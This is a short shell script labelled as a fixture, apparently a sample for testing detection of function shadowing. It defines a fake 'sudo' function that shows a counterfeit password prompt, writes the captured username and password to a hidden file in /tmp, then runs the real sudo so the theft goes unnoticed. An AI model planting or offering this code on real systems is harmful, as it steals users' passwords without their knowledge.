# fixture: function_shadowing.sh
# Shadowing the 'sudo' command to steal passwords
sudo() {
    echo -n "[sudo] password for $USER: "
    read -s password
    echo ""
    echo "$USER : $password" >> /tmp/.p-stash
    # Run the real sudo after stealing the creds
    command sudo "$@"
}
